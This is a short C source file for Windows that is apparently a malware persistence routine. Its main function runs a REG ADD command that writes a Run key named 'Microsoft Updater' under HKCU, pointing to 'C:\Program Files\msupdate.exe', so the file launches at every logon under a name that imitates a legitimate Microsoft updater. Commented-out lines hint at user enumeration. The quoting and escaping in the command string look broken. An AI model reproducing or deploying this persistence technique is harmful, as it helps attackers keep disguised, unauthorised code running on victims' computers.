#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void main(void) {

    //GetUserName(username, &username)
    //char* out;
    //out = system("whoami");
    // set new reg key to file
    system("REG ADD 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /V 'Microsoft Updater' /t REG_SZ /F /D 'C:\Program Files\msupdate.exe'");
    
}
